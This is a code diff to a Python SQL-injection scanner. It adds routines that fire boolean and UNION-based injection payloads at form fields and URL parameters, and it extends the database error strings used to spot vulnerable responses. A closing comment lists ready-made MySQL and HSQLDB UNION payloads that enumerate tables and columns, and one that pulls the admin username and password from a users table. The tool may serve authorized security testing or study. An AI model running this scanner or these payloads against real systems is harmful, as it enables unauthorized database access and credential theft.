@@ -4,6 +4,7 @@ from pprint import pprint
 
 import requests
 from bs4 import BeautifulSoup as bs
+from injections import injections
 
 s = requests.Session()
 s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " \
@@ -78,7 +79,14 @@ def is_vulnerable(response):
         # MariaDB
         "malformed",
         # Python
-        "unrecognized token"
+        "unrecognized token",
+        # Column mismatch
+        "column number mismatch",
+        "statements have a different number of columns",
+        "data exception: invalid",
+        ": unexpected token",
+        ": unknown token",
+        "null",
     }
     for error in errors:
         if error in response.content.decode().lower():
@@ -107,13 +115,14 @@ def check_form(url):
                 res = s.post(url, data=data)
             elif form_details["method"] == "get":
                 res = s.get(url, params=data)
-            print(data)
             # Check response
             if is_vulnerable(res):
                 vulnerable = True
                 print("\nSQL Injection vulnerability detected in:\n\t", url)
-                print("data:")
-                pprint(data)
+                ## TODO hardcode
+                check_injections(url, data, "id", form_details["method"].upper())
+                # print("data:")
+                # pprint(data)
     if not vulnerable:
         print(url, "\n\tdoesn't seem to be vulnerable")
 
@@ -137,16 +146,66 @@ def check_url(url, data, method):
             quit()
         if is_vulnerable(res):
             print(f"[X] data-name '{k}' might be vulnerable")
+            check_injections(url, data, k, method)
         else:
             print(f"[-] data-name '{k}' is not vulnerable")
         data[k] = value
 
+def check_injections(url, data, key, method):
+    print("\tTrying BOOLEAN type injections")
+    print("\t- Numeric:")
+    check_list_injections(url, data, key, method, injections["numeric"])
+    print("\t- String:")
+    check_list_injections(url, data, key, method, injections["string"])
+    print("\tTrying UNION type injections")
+    print("\t- mysql/mariadb numeric:")
+    found = False
+    if check_list_injections(url, data, key, method, injections["mysql_num"]):
+        found = True
+    print("\t- mysql/mariadb string:")
+    if check_list_injections(url, data, key, method, injections["mysql_str"]):
+        found = True
+    # if found: return
+    print("\t- hsqldb numeric:")
+    check_list_injections(url, data, key, method, injections["hsqldb_num"])
+    print("\t- hsqldb string:")
+    check_list_injections(url, data, key, method, injections["hsqldb_str"])
+
+
+def check_list_injections(url, data, key, method, injects):
+    for i in injects:
+        data[key] = i
+        try:
+            if method == "GET":
+                res = s.get(url, params=data)
+            elif method == "POST":
+                res = s.post(url, data=data)
+        except Exception as e:
+            print(e)
+            quit()
+        if (res.status_code == 404):
+            print("Error 404: incorrect url or whatever")
+            quit()
+        if not is_vulnerable(res):
+            print(f"\t[X] Found injection:\n{i}")
+            return True
+    print("\t[-] Nope")
+    return False
+
+
 '''
+MySQL
 https://portswigger.net/web-security/sql-injection/examining-the-database
 ' UNION SELECT NULL, @@version; -- 
 ' UNION SELECT table_catalog,table_name FROM information_schema.tables; -- 
 ' UNION SELECT table_name,column_name FROM information_schema.columns; -- 
 
+HSQLDB
+select character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'
+
+' union select null,null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- 
+' union select null,null,null,null,null,'hola'||table_name||'hola' from information_schema.tables; -- 
+' union select null,null,null,null,null,'hola'||column_name||'hola' from information_schema.columns; -- 
 
 2 UNION ALL SELECT NULL, NULL, NULL, (SELECT id||','||username||','||password FROM users WHERE username='admin')
 '''
